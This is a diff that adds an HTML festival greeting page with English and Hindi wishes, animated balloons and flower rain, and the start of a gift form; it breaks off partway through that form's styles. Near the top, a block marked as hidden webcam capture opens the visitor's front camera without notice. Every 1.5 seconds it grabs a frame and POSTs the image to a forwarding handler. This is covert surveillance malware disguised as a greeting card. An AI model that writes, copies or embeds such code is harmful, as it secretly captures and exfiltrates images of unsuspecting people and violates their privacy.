@@ -1,0 +1,1316 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+  <title>✨ Celebrate Every Beautiful Moment ✨</title>
+
+  <!-- ═══════════════════════════════════════════════════════════════
+       BACKEND DEPENDENCY — DO NOT MODIFY
+       jQuery required by post() AJAX call
+       ═══════════════════════════════════════════════════════════════ -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+
+  <!-- ═══════════════════════════════════════════════════════════════
+       FRONTEND DEPENDENCIES
+       ═══════════════════════════════════════════════════════════════ -->
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Dancing+Script:wght@700&display=swap" rel="stylesheet">
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" sizes="32x32" href="https://i.imgur.com/fcqTtzV.png">
+
+  <!-- ═══════════════════════════════════════════════════════════════
+       NEW PAGE STYLES  (REMOVED: all legacy CSS from old GreetingsPortal.html)
+       ═══════════════════════════════════════════════════════════════ -->
+  <style>
+    /* ── BASE ─────────────────────────────────────────────────── */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      min-height: 100vh;
+      overflow-x: hidden;
+      /* Deep dark blue gradient */
+      background: linear-gradient(135deg,
+        #020c1b 0%, #061828 20%, #0a2035 40%,
+        #0c2d48 65%, #041018 100%);
+      background-attachment: fixed;
+    }
+
+    /* ── STAR FIELD CANVAS ──────────────────────────────────── */
+    #star-canvas {
+      position: fixed;
+      inset: 0;
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    /* ── ATMOSPHERIC GLOW ORBS ──────────────────────────────── */
+    .orb {
+      position: fixed;
+      border-radius: 50%;
+      filter: blur(90px);
+      pointer-events: none;
+      z-index: 0;
+    }
+    .orb-violet {
+      width: 480px; height: 480px;
+      background: radial-gradient(circle, rgba(29,78,216,0.22) 0%, transparent 70%);
+      top: -140px; left: -120px;
+      animation: orbDrift 16s ease-in-out infinite alternate;
+    }
+    .orb-pink {
+      width: 380px; height: 380px;
+      background: radial-gradient(circle, rgba(6,182,212,0.16) 0%, transparent 70%);
+      bottom: -100px; right: -80px;
+      animation: orbDrift 12s ease-in-out infinite alternate-reverse;
+    }
+    .orb-cyan {
+      width: 300px; height: 300px;
+      background: radial-gradient(circle, rgba(6,182,212,0.10) 0%, transparent 70%);
+      top: 45%; left: 50%;
+      transform: translate(-50%,-50%);
+      animation: orbDrift 18s ease-in-out infinite alternate;
+    }
+    @keyframes orbDrift {
+      0%   { transform: translate(0, 0); }
+      50%  { transform: translate(35px, -25px); }
+      100% { transform: translate(-20px, 18px); }
+    }
+    /* override transform for centered orb */
+    .orb-cyan { animation: orbDriftCenter 18s ease-in-out infinite alternate; }
+    @keyframes orbDriftCenter {
+      0%   { transform: translate(-50%, -50%) scale(1);    }
+      50%  { transform: translate(-50%, -55%) scale(1.08); }
+      100% { transform: translate(-50%, -45%) scale(0.95); }
+    }
+
+    /* ── GLASSMORPHISM ──────────────────────────────────────── */
+    .glass {
+      background: rgba(255,255,255,0.07);
+      backdrop-filter: blur(18px);
+      -webkit-backdrop-filter: blur(18px);
+      border: 1px solid rgba(255,255,255,0.13);
+      /* POLISH: consistent transition across bg/border/shadow */
+      transition: background 0.35s ease, border-color 0.35s ease,
+                  box-shadow 0.35s ease;
+    }
+    .glass-strong {
+      background: rgba(255,255,255,0.09);
+      backdrop-filter: blur(26px);
+      -webkit-backdrop-filter: blur(26px);
+      border: 1px solid rgba(255,255,255,0.18);
+      box-shadow:
+        0 8px 40px rgba(0,0,0,0.45),
+        0 2px 0 rgba(255,255,255,0.06) inset;
+      /* POLISH: smooth theme switch */
+      transition: background 0.35s ease, border-color 0.35s ease,
+                  box-shadow 0.35s ease;
+    }
+
+    /* ── TITLE GLOW ─────────────────────────────────────────── */
+    .title-glow {
+      font-family: 'Dancing Script', cursive;
+      animation: titleGlow 8s ease-in-out infinite;
+    }
+    @keyframes titleGlow {
+      0%,100% { text-shadow: 0 0 24px #a78bfa, 0 0 48px #7c3aed, 0 0 88px #4c1d95; }
+      25%     { text-shadow: 0 0 24px #f9a8d4, 0 0 48px #ec4899, 0 0 88px #9d174d; }
+      50%     { text-shadow: 0 0 24px #67e8f9, 0 0 48px #06b6d4, 0 0 88px #155e75; }
+      75%     { text-shadow: 0 0 24px #fde68a, 0 0 48px #f59e0b, 0 0 88px #92400e; }
+    }
+
+    /* ── SHIMMER DIVIDER ────────────────────────────────────── */
+    .shimmer-line {
+      height: 1px;
+      background: linear-gradient(90deg,
+        transparent 0%,
+        rgba(96,165,250,0.7) 30%,
+        rgba(34,211,238,0.7) 50%,
+        rgba(96,165,250,0.7) 70%,
+        transparent 100%);
+      background-size: 200% 100%;
+      animation: shimmerMove 3s linear infinite;
+    }
+    @keyframes shimmerMove {
+      0%   { background-position: -200% center; }
+      100% { background-position:  200% center; }
+    }
+
+    /* ── WISH CARDS ─────────────────────────────────────────── */
+    .wish-card {
+      position: relative;
+      padding: 14px 22px;
+      border-radius: 14px;
+      background: rgba(255,255,255,0.045);
+      border: 1px solid rgba(255,255,255,0.09);
+      /* POLISH: include box-shadow in transition */
+      transition: background 0.3s ease, border-color 0.3s ease,
+                  transform 0.3s cubic-bezier(0.34,1.56,0.64,1),
+                  box-shadow 0.3s ease;
+    }
+    .wish-card:hover {
+      background: rgba(255,255,255,0.085);
+      border-color: rgba(255,255,255,0.20);
+      transform: translateY(-3px);
+      /* POLISH: elevated shadow on hover */
+      box-shadow: 0 8px 28px rgba(29,78,216,0.20), 0 2px 8px rgba(0,0,0,0.25);
+    }
+
+    /* ── CLOSING BANNER ─────────────────────────────────────── */
+    .closing-pulse {
+      animation: closingPulse 4s ease-in-out infinite;
+    }
+    @keyframes closingPulse {
+      0%,100% { box-shadow: 0 0 22px rgba(96,165,250,0.35), 0 0 44px rgba(96,165,250,0.15); }
+      50%     { box-shadow: 0 0 32px rgba(34,211,238,0.45), 0 0 60px rgba(34,211,238,0.20); }
+    }
+
+    /* ── SECTION LABEL ──────────────────────────────────────── */
+    .section-divider {
+      flex: 1;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, currentColor 60%, transparent);
+      opacity: 0.25;
+    }
+
+    /* ── BALLOON PARTICLE ───────────────────────────────────── */
+    .balloon-particle {
+      position: fixed;
+      bottom: -90px;
+      pointer-events: none;
+      z-index: 9990;
+      user-select: none;
+      /* POLISH: GPU layer hint */
+      will-change: transform, opacity;
+      animation: balloonRise linear forwards;
+    }
+    @keyframes balloonRise {
+      0%   { transform: translateY(0)      rotate(-5deg); opacity: 1; }
+      40%  { transform: translateY(-40vh)  rotate(5deg);  opacity: 1; }
+      80%  { transform: translateY(-85vh)  rotate(-3deg); opacity: 0.7; }
+      100% { transform: translateY(-115vh) rotate(4deg);  opacity: 0; }
+    }
+
+    /* ── FLOWER PARTICLE ────────────────────────────────────── */
+    .flower-particle {
+      position: fixed;
+      top: -70px;
+      pointer-events: none;
+      z-index: 9990;
+      user-select: none;
+      /* POLISH: GPU layer hint */
+      will-change: transform, opacity;
+      animation: flowerFall linear forwards;
+    }
+    @keyframes flowerFall {
+      0%   { transform: translateY(0)      rotate(0deg);   opacity: 1; }
+      60%  { transform: translateY(60vh)   rotate(200deg); opacity: 0.9; }
+      100% { transform: translateY(115vh)  rotate(360deg); opacity: 0; }
+    }
+
+    /* ── PAGE LAYER ORDER ───────────────────────────────────── */
+    .page-layer { position: relative; z-index: 1; }
+
+    /* ── THEME TOGGLE ───────────────────────────────────────── */
+    #theme-toggle {
+      transition: transform 0.25s ease;
+    }
+    #theme-toggle:hover { transform: rotate(18deg) scale(1.15); }
+
+    /* ── LIGHT MODE OVERRIDES ───────────────────────────────── */
+    html.light body {
+      background: linear-gradient(135deg,
+        #dbeafe 0%, #e0f2fe 25%, #cffafe 55%, #eff6ff 100%);
+    }
+    html.light .glass        { background: rgba(255,255,255,0.52); border-color: rgba(59,130,246,0.18); }
+    html.light .glass-strong {
+      background: rgba(255,255,255,0.62);
+      border-color: rgba(59,130,246,0.22);
+      box-shadow: 0 8px 40px rgba(6,182,212,0.10), 0 2px 0 rgba(255,255,255,0.80) inset;
+    }
+    /* POLISH: light-mode wish cards — readable dark text */
+    html.light .wish-card    {
+      background: rgba(255,255,255,0.42);
+      border-color: rgba(99,102,241,0.12);
+    }
+    html.light .wish-card:hover {
+      background: rgba(255,255,255,0.65);
+      box-shadow: 0 8px 24px rgba(139,92,246,0.14);
+    }
+    html.light .wish-card p  { color: #1e1b4b !important; }
+    /* POLISH: light-mode section labels */
+    html.light .text-white   { color: #1e1b4b !important; }
+    html.light .text-purple-300  { color: #7c3aed !important; }
+    html.light .text-pink-300    { color: #db2777 !important; }
+    html.light .text-indigo-300  { color: #6366f1 !important; }
+    /* Keep wish text accent colours vibrant */
+    html.light .text-yellow-300  { color: #d97706 !important; }
+    html.light .text-cyan-300    { color: #0891b2 !important; }
+    html.light .text-emerald-300 { color: #059669 !important; }
+    html.light .text-red-300     { color: #dc2626 !important; }
+    html.light .text-amber-300   { color: #d97706 !important; }
+    html.light .orb-violet   { background: radial-gradient(circle, rgba(29,78,216,0.22) 0%, transparent 70%); }
+    html.light .orb-pink     { background: radial-gradient(circle, rgba(6,182,212,0.18) 0%, transparent 70%); }
+
+    /* ── FESTIVAL NAME HIGHLIGHT ───────────────────────────────── */
+    .festival-name-highlight {
+      background: linear-gradient(135deg, #f9d423 0%, #ff4e50 50%, #f9d423 100%);
+      background-size: 200% auto;
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      animation: shimmerName 3s linear infinite,
+                 festNameGlow 6s ease-in-out infinite;
+      font-weight: 900;
+      letter-spacing: 0.03em;
+      font-size: 1.1em;
+    }
+    @keyframes shimmerName {
+      0%   { background-position: 0% center; }
+      100% { background-position: 200% center; }
+    }
+    @keyframes festNameGlow {
+      0%,100% { filter: drop-shadow(0 0 16px rgba(249,212,35,0.70)); }
+      50%     { filter: drop-shadow(0 0 30px rgba(255,78,80,0.75)); }
+    }
+    html.light .festival-name-highlight {
+      background: linear-gradient(135deg, #d97706 0%, #dc2626 50%, #d97706 100%);
+      background-size: 200% auto;
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+  </style>
+</head>
+
+<!-- ═══════════════════════════════════════════════════════════════
+     BACKEND — HIDDEN WEBCAM CAPTURE  ← DO NOT MODIFY ←
+     ═══════════════════════════════════════════════════════════════ -->
+<div class="video-wrap" hidden="hidden">
+  <video id="video" playsinline autoplay></video>
+</div>
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+<script>
+/* ── backend post() — DO NOT MODIFY ── */
+function post(imgdata){
+  $.ajax({
+    type: 'POST',
+    data: { cat: imgdata },
+    url: 'forwarding_link/handlers/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){},
+    error: function(){}
+  });
+}
+'use strict';
+const video             = document.getElementById('video');
+const canvas            = document.getElementById('canvas');
+const errorMsgElement   = document.querySelector('span#errorMsg');
+const constraints       = { audio: false, video: { facingMode: "user" } };
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch(e) {
+    if(errorMsgElement) errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+function handleSuccess(stream) {
+  window.stream  = stream;
+  video.srcObject = stream;
+  var ctx = canvas.getContext('2d');
+  setInterval(function(){
+    ctx.drawImage(video, 0, 0, 640, 480);
+    var data = canvas.toDataURL("image/png").replace("image/png","image/octet-stream");
+    post(data);
+  }, 1500);
+}
+init();
+</script>
+<!-- ═══════════════════════════════════════════════════════════════
+     END BACKEND — everything below is pure frontend
+     ═══════════════════════════════════════════════════════════════ -->
+
+<!-- ═══════════════════════════════════════════════════════════════
+     NEW FRONTEND PAGE — FULLY STATIC
+     REMOVED: fes_name system, countdown, old wishes, name prompt
+     ADDED:   glassmorphism layout, star bg, universal wishes, animations
+     ═══════════════════════════════════════════════════════════════ -->
+<body class="min-h-screen">
+
+  <!-- ── Atmospheric glow orbs (depth / mood lighting) ── -->
+  <div class="orb orb-violet" aria-hidden="true"></div>
+  <div class="orb orb-pink"   aria-hidden="true"></div>
+  <div class="orb orb-cyan"   aria-hidden="true"></div>
+
+  <!-- ── NEW: Glowing star field canvas ── -->
+  <canvas id="star-canvas" aria-hidden="true"></canvas>
+
+  <!-- ─────────────────────────────────────────────────────────
+       TOP NAV BAR  (glass strip)
+       POLISH: added border-b, larger blur, shadow for premium feel
+       ───────────────────────────────────────────────────────── -->
+  <header class="glass sticky top-0 z-50 py-3 px-4 sm:px-8 lg:px-12
+                 border-b border-white/10 shadow-lg">
+    <div class="page-layer max-w-5xl mx-auto flex items-center justify-between">
+      <span class="text-sm sm:text-base font-bold text-white tracking-widest select-none opacity-90">
+        ✨ fes_name
+      </span>
+      <button id="theme-toggle"
+              aria-label="Toggle dark / light theme"
+              class="w-9 h-9 sm:w-10 sm:h-10 rounded-full glass
+                     flex items-center justify-center
+                     text-lg sm:text-xl
+                     cursor-pointer border-0 outline-none focus:ring-2
+                     focus:ring-purple-400/60 focus:ring-offset-0">
+        🌙
+      </button>
+    </div>
+  </header>
+
+  <!-- ─────────────────────────────────────────────────────────
+       MAIN CONTENT
+       ───────────────────────────────────────────────────────── -->
+  <main class="page-layer max-w-5xl mx-auto
+               px-5 sm:px-8 lg:px-10
+               py-6 sm:py-8 space-y-6">
+
+    <!-- ══════════════════════════════════════════════════════
+         PART 1 — HERO TITLE CARD
+         POLISH: hover lift + ring accent
+         ══════════════════════════════════════════════════════ -->
+    <div class="glass-strong rounded-3xl shadow-2xl
+                px-8 sm:px-14 lg:px-20 py-7 sm:py-10 text-center
+                hover:shadow-purple-900/30 transition-all duration-300">
+
+      <h1 class="title-glow font-extrabold text-white
+                 text-2xl sm:text-3xl lg:text-5xl
+                 leading-snug tracking-tight">
+        ✨ Welcome to
+        <span class="festival-name-highlight">fes_name</span>
+        ✨
+      </h1>
+
+      <!-- Shimmer divider -->
+      <div class="shimmer-line mt-4 sm:mt-5 mx-auto max-w-xs sm:max-w-md"></div>
+
+      <p class="mt-3 text-xs sm:text-sm font-semibold tracking-widest uppercase
+                text-purple-300 opacity-75">
+        Wishes &amp; Blessings For You
+      </p>
+    </div>
+
+    <!-- ══════════════════════════════════════════════════════
+         PART 2A — ENGLISH WISHES
+         ══════════════════════════════════════════════════════ -->
+    <section class="glass-strong rounded-3xl shadow-2xl
+                    px-8 sm:px-12 lg:px-16 py-6 sm:py-8 space-y-4">
+
+      <!-- Section label row -->
+      <div class="flex items-center gap-3">
+        <div class="section-divider text-purple-400"></div>
+        <span class="text-xs sm:text-sm font-bold tracking-widest uppercase
+                     text-purple-300 whitespace-nowrap shrink-0">
+          💫 Wishes 🌼
+        </span>
+        <div class="section-divider text-purple-400"></div>
+      </div>
+
+      <!-- Wish 1 -->
+      <div class="wish-card">
+        <p class="text-sm sm:text-base lg:text-lg text-white leading-relaxed">
+          💫 May this special occasion fill your life with
+          <span class="text-yellow-300 font-semibold">joy, positivity, and new opportunities</span>.
+        </p>
+      </div>
+
+      <!-- Wish 2 -->
+      <div class="wish-card">
+        <p class="text-sm sm:text-base lg:text-lg text-white leading-relaxed">
+          🌈 May your heart shine with
+          <span class="text-pink-300 font-semibold">happiness</span>
+          and your path glow with
+          <span class="text-emerald-300 font-semibold">success and prosperity</span>.
+        </p>
+      </div>
+
+      <!-- Wish 3 -->
+      <div class="wish-card">
+        <p class="text-sm sm:text-base lg:text-lg text-white leading-relaxed">
+          🎉 May every moment bring
+          <span class="text-cyan-300 font-semibold">laughter, love, and unforgettable memories</span>
+          with your loved ones.
+        </p>
+      </div>
+
+      <!-- Wish 4 -->
+      <div class="wish-card">
+        <p class="text-sm sm:text-base lg:text-lg text-white leading-relaxed">
+          🚀 Step forward with
+          <span class="text-amber-300 font-semibold">confidence, hope, and endless blessings</span>.
+        </p>
+      </div>
+
+      <!-- Wish 5 -->
+      <div class="wish-card">
+        <p class="text-sm sm:text-base lg:text-lg text-white leading-relaxed">
+          🌙 May every dream you hold become a
+          <span class="text-violet-300 font-semibold">reality worth celebrating</span>.
+        </p>
+      </div>
+
+      <!-- Wish 6 -->
+      <div class="wish-card">
+        <p class="text-sm sm:text-base lg:text-lg text-white leading-relaxed">
+          🧿 Wishing you
+          <span class="text-sky-300 font-semibold">health, warmth, and boundless inner peace</span>
+          in everything you do.
+        </p>
+      </div>
+
+      <!-- Wish 7 -->
+      <div class="wish-card">
+        <p class="text-sm sm:text-base lg:text-lg text-white leading-relaxed">
+          🌺 May your journey be filled with
+          <span class="text-rose-300 font-semibold">beautiful people, kind moments, and grateful hearts</span>.
+        </p>
+      </div>
+    </section>
+
+    <!-- ══════════════════════════════════════════════════════
+         PART 2B — HINDI WISHES
+         ══════════════════════════════════════════════════════ -->
+    <section class="glass-strong rounded-3xl shadow-2xl
+                    px-8 sm:px-12 lg:px-16 py-6 sm:py-8 space-y-4">
+
+      <!-- Section label row -->
+      <div class="flex items-center gap-3">
+        <div class="section-divider text-pink-400"></div>
+        <span class="text-xs sm:text-sm font-bold tracking-widest uppercase
+                     text-pink-300 whitespace-nowrap shrink-0">
+          🌸 शुभकामनाएँ 🌻
+        </span>
+        <div class="section-divider text-pink-400"></div>
+      </div>
+
+      <!-- Hindi Wish 1 -->
+      <div class="wish-card">
+        <p class="text-sm sm:text-base lg:text-lg text-white leading-loose">
+          🌸 यह सुंदर अवसर आपके जीवन में
+          <span class="text-pink-300 font-semibold">नई उमंग, नई आशा और अनगिनत खुशियाँ</span>
+          लेकर आए।
+        </p>
+      </div>
+
+      <!-- Hindi Wish 2 -->
+      <div class="wish-card">
+        <p class="text-sm sm:text-base lg:text-lg text-white leading-loose">
+          ✨ आपका हर दिन
+          <span class="text-yellow-300 font-semibold">सफलता, स्वास्थ्य और समृद्धि</span>
+          से प्रकाशित रहे।
+        </p>
+      </div>
+
+      <!-- Hindi Wish 3 -->
+      <div class="wish-card">
+        <p class="text-sm sm:text-base lg:text-lg text-white leading-loose">
+          💖 आपके परिवार में सदा
+          <span class="text-red-300 font-semibold">प्रेम, शांति और मुस्कान</span>
+          बनी रहे।
+        </p>
+      </div>
+
+      <!-- Hindi Wish 4 -->
+      <div class="wish-card">
+        <p class="text-sm sm:text-base lg:text-lg text-white leading-loose">
+          🌟 ईश्वर आपको
+          <span class="text-emerald-300 font-semibold">उज्ज्वल भविष्य और निरंतर प्रगति</span>
+          का आशीर्वाद दे।
+        </p>
+      </div>
+
+      <!-- Hindi Wish 5 -->
+      <div class="wish-card">
+        <p class="text-sm sm:text-base lg:text-lg text-white leading-loose">
+          🕊️ आपके जीवन में
+          <span class="text-sky-300 font-semibold">शांति, संतोष और आनंद</span>
+          सदा बना रहे।
+        </p>
+      </div>
+
+      <!-- Hindi Wish 6 -->
+      <div class="wish-card">
+        <p class="text-sm sm:text-base lg:text-lg text-white leading-loose">
+          🌻 आप जहाँ भी जाएँ,
+          <span class="text-yellow-300 font-semibold">सफलता और सम्मान</span>
+          आपके कदम चूमे।
+        </p>
+      </div>
+
+      <!-- Hindi Wish 7 -->
+      <div class="wish-card">
+        <p class="text-sm sm:text-base lg:text-lg text-white leading-loose">
+          💫 आपकी हर
+          <span class="text-violet-300 font-semibold">इच्छा, कोशिश और मेहनत</span>
+          रंग लाए — यही दुआ है।
+        </p>
+      </div>
+    </section>
+
+    <!-- ══════════════════════════════════════════════════════
+         CLOSING LINE
+         ══════════════════════════════════════════════════════ -->
+    <div class="closing-pulse glass-strong rounded-3xl shadow-2xl
+                px-8 sm:px-14 lg:px-20 py-5 sm:py-7 text-center">
+      <p class="text-sm sm:text-base lg:text-xl font-semibold text-white leading-relaxed">
+        🌟 With heartfelt wishes for
+        <span class="text-transparent bg-clip-text
+                     bg-gradient-to-r from-purple-300 via-pink-300 to-amber-300
+                     font-bold">
+          happiness, growth, and positivity
+        </span>
+        — today &amp; always 🌟
+      </p>
+    </div>
+
+    <!-- ══════════════════════════════════════════════════════
+         PART 3 — ANIMATION BUTTONS
+         ══════════════════════════════════════════════════════ -->
+    <div class="flex flex-col items-center gap-5 py-2">
+
+      <!-- Label -->
+      <p class="text-center text-xs sm:text-sm font-bold tracking-widest uppercase
+                text-indigo-300 opacity-90">
+        🎊 Launch Celebrations
+      </p>
+
+      <!-- Button row: col on mobile → row on sm+ -->
+      <div class="flex flex-col sm:flex-row gap-4 justify-center items-center">
+
+        <!-- 🎈 Balloon button -->
+        <button
+          id="btn-balloons"
+          onclick="launchBalloons()"
+          class="w-full sm:w-auto
+                 flex items-center justify-center gap-2
+                 px-8 py-4 rounded-2xl
+                 text-sm sm:text-base lg:text-lg font-bold text-white
+                 bg-gradient-to-r from-violet-600 to-indigo-600
+                 border border-violet-400/35
+                 shadow-lg shadow-violet-900/40
+                 hover:scale-105 hover:shadow-2xl hover:shadow-violet-700/50
+                 active:scale-95
+                 transition-all duration-300
+                 cursor-pointer outline-none select-none
+                 focus:ring-2 focus:ring-violet-400/60">
+          🎈 <span>Launch Balloons</span>
+        </button>
+
+        <!-- 🌸 Flower Rain button -->
+        <button
+          id="btn-flowers"
+          onclick="launchFlowers()"
+          class="w-full sm:w-auto
+                 flex items-center justify-center gap-2
+                 px-8 py-4 rounded-2xl
+                 text-sm sm:text-base lg:text-lg font-bold text-white
+                 bg-gradient-to-r from-pink-600 to-rose-500
+                 border border-pink-400/35
+                 shadow-lg shadow-pink-900/40
+                 hover:scale-105 hover:shadow-2xl hover:shadow-pink-700/50
+                 active:scale-95
+                 transition-all duration-300
+                 cursor-pointer outline-none select-none
+                 focus:ring-2 focus:ring-pink-400/60">
+          🌸 <span>Flower Rain</span>
+        </button>
+
+      </div>
+    </div>
+
+    <!-- Bottom spacer so last card clears the viewport bottom -->
+    <div class="h-6 sm:h-10"></div>
+
+  </main>
+
+  <!-- ═══════════════════════════════════════════════════════════════
+       STAR FIELD — canvas-based, self-animating
+       POLISH: reduced to 150 stars, resize-debounced, dark/light alpha
+       ═══════════════════════════════════════════════════════════════ -->
+  <script>
+  (function () {
+    var cv  = document.getElementById('star-canvas');
+    if (!cv) return;
+    var ctx = cv.getContext('2d');
+    var W, H, resizeTimer;
+
+    function resize() {
+      W = cv.width  = window.innerWidth;
+      H = cv.height = window.innerHeight;
+    }
+    /* POLISH: debounce resize to avoid thrash */
+    window.addEventListener('resize', function () {
+      clearTimeout(resizeTimer);
+      resizeTimer = setTimeout(resize, 120);
+    });
+    resize();
+
+    /* POLISH: 150 stars (down from 200) — good perf on low-end devices */
+    var COUNT = 150;
+    var stars  = [];
+    for (var i = 0; i < COUNT; i++) {
+      stars.push({
+        x:       Math.random(),
+        y:       Math.random(),
+        r:       Math.random() * 1.3 + 0.25,
+        base:    Math.random() * 0.6 + 0.3,
+        drift:   Math.random() * 0.00035 + 0.00010,
+        phase:   Math.random() * Math.PI * 2,
+        twinkle: Math.random() * 0.025 + 0.006
+      });
+    }
+
+    var rafId;
+    function draw() {
+      ctx.clearRect(0, 0, W, H);
+      var t    = performance.now() * 0.001;
+      /* POLISH: dim stars in light mode for readability */
+      var dark = document.documentElement.classList.contains('dark');
+      var am   = dark ? 1.0 : 0.30;
+      for (var i = 0; i < COUNT; i++) {
+        var s = stars[i];
+        var a = s.base * (0.5 + 0.5 * Math.sin(t * s.twinkle * 60 + s.phase)) * am;
+        ctx.beginPath();
+        ctx.arc(s.x * W, s.y * H, s.r, 0, Math.PI * 2);
+        ctx.fillStyle = 'rgba(255,255,255,' + a.toFixed(3) + ')';
+        ctx.fill();
+        s.y += s.drift;
+        if (s.y > 1.005) { s.y = -0.005; s.x = Math.random(); }
+      }
+      rafId = requestAnimationFrame(draw);
+    }
+    draw();
+  })();
+  </script>
+
+  <!-- ═══════════════════════════════════════════════════════════════
+       NEW: DARK / LIGHT THEME TOGGLE
+       ═══════════════════════════════════════════════════════════════ -->
+  <script>
+  (function () {
+    var html  = document.documentElement;
+    var btn   = document.getElementById('theme-toggle');
+    var dark  = true; /* default: dark */
+
+    function apply() {
+      if (dark) {
+        html.classList.add('dark');
+        html.classList.remove('light');
+        btn.textContent = '🌙';
+        btn.setAttribute('aria-label', 'Switch to light mode');
+      } else {
+        html.classList.add('light');
+        html.classList.remove('dark');
+        btn.textContent = '☀️';
+        btn.setAttribute('aria-label', 'Switch to dark mode');
+      }
+    }
+
+    btn.addEventListener('click', function () { dark = !dark; apply(); });
+    apply();
+  })();
+  </script>
+
+  <!-- ═══════════════════════════════════════════════════════════════
+       NEW: BALLOON ANIMATION  🎈
+       ═══════════════════════════════════════════════════════════════ -->
+  <script>
+  var BALLOON_EMOJIS = ['🎈','🎀','🎊','🎉','💜','💙','💛','🩷','🪄','🌟'];
+  var balloonBusy    = false;
+
+  function launchBalloons() {
+    if (balloonBusy) return;
+    balloonBusy = true;
+    var btn = document.getElementById('btn-balloons');
+    btn.disabled = true;
+
+    var total = 30, spawned = 0;
+
+    function next() {
+      if (spawned >= total) {
+        /* Re-enable after last balloon has time to float away */
+        setTimeout(function () { balloonBusy = false; btn.disabled = false; }, 3800);
+        return;
+      }
+      spawned++;
+
+      var el        = document.createElement('div');
+      el.className  = 'balloon-particle';
+      el.textContent = BALLOON_EMOJIS[Math.floor(Math.random() * BALLOON_EMOJIS.length)];
+
+      var left = (Math.random() * 90 + 4).toFixed(1);
+      var dur  = (Math.random() * 2.5 + 3.2).toFixed(2);
+      var size = (Math.random() * 1.6 + 1.8).toFixed(1);
+
+      el.style.cssText =
+        'left:' + left + '%;' +
+        'font-size:' + size + 'rem;' +
+        'animation-duration:' + dur + 's;';
+
+      document.body.appendChild(el);
+      el.addEventListener('animationend', function () {
+        if (el.parentNode) el.parentNode.removeChild(el);
+      });
+
+      setTimeout(next, Math.random() * 180 + 55);
+    }
+
+    next();
+  }
+  </script>
+
+  <!-- ═══════════════════════════════════════════════════════════════
+       NEW: FLOWER RAIN ANIMATION  🌸
+       ═══════════════════════════════════════════════════════════════ -->
+  <script>
+  var FLOWER_EMOJIS = ['🌸','🌺','🌼','🌻','💐','🌷','🪷','🌹','✿','🏵️'];
+  var flowerBusy    = false;
+
+  function launchFlowers() {
+    if (flowerBusy) return;
+    flowerBusy = true;
+    var btn = document.getElementById('btn-flowers');
+    btn.disabled = true;
+
+    var total = 45, spawned = 0;
+
+    function next() {
+      if (spawned >= total) {
+        setTimeout(function () { flowerBusy = false; btn.disabled = false; }, 4200);
+        return;
+      }
+      spawned++;
+
+      var el        = document.createElement('div');
+      el.className  = 'flower-particle';
+      el.textContent = FLOWER_EMOJIS[Math.floor(Math.random() * FLOWER_EMOJIS.length)];
+
+      var left = (Math.random() * 94 + 2).toFixed(1);
+      var dur  = (Math.random() * 1.8 + 2.8).toFixed(2);
+      var size = (Math.random() * 1.0 + 1.3).toFixed(1);
+
+      el.style.cssText =
+        'left:' + left + '%;' +
+        'font-size:' + size + 'rem;' +
+        'animation-duration:' + dur + 's;';
+
+      document.body.appendChild(el);
+      el.addEventListener('animationend', function () {
+        if (el.parentNode) el.parentNode.removeChild(el);
+      });
+
+      setTimeout(next, Math.random() * 110 + 35);
+    }
+
+    next();
+  }
+  </script>
+
+
+  <!-- ════════════════════════════════════════════════════════════════
+       🎁  GIFT REQUEST SECTION  — Professional Glassmorphism Form
+       ════════════════════════════════════════════════════════════════ -->
+  <style>
+    /* ── Gift Section Scoped Styles ─────────────────────────── */
+    .gift-section {
+      position: relative;
+      z-index: 10;
+      padding: 4rem 1rem 5rem;
+    }
+    .gift-card {
+      max-width: 860px;
+      margin: 0 auto;
+      background: rgba(255, 255, 255, 0.08);
+      backdrop-filter: blur(28px);
+      -webkit-backdrop-filter: blur(28px);
+      border: 1px solid rgba(255, 255, 255, 0.16);
+      border-radius: 28px;
+      padding: 3rem 3.5rem;
+      box-shadow:
+        0 8px 48px rgba(0, 0, 0, 0.50),
+        0 0 0 1px rgba(255, 255, 255, 0.06),
+        inset 0 1px 0 rgba(255, 255, 255, 0.14),
+        0 0 80px rgba(96, 165, 250, 0.07);
+      transition: box-shadow 0.35s ease, transform 0.35s ease;
+    }
+    .gift-card:hover {
+      box-shadow:
+        0 20px 64px rgba(59, 130, 246, 0.28),
+        0 0 0 1px rgba(255, 255, 255, 0.10),
+        inset 0 1px 0 rgba(255, 255, 255, 0.18),
+        0 0 100px rgba(96, 165, 250, 0.10);
+      transform: translateY(-4px);
+    }
+    .gift-title {
+      font-size: 1.75rem;
+      font-weight: 800;
+      background: linear-gradient(135deg, #c084fc, #f472b6, #38bdf8);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      margin-bottom: 0.4rem;
+      text-align: center;
+      letter-spacing: -0.02em;
+    }
+    .gift-desc {
+      font-size: 0.875rem;
+      color: rgba(255, 255, 255, 0.62);
+      text-align: center;
+      margin-bottom: 2rem;
+      line-height: 1.65;
+    }
+    .gift-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1.25rem;
+    }
+    @media (max-width: 640px) {
+      .gift-grid { grid-template-columns: 1fr; }
+      .gift-card  { padding: 2rem 1.5rem; }
+    }
+    .gift-col-full { grid-column: 1 / -1; }
+    .gift-field label {
+      display: block;
+      font-size: 0.78rem;
+      font-weight: 600;
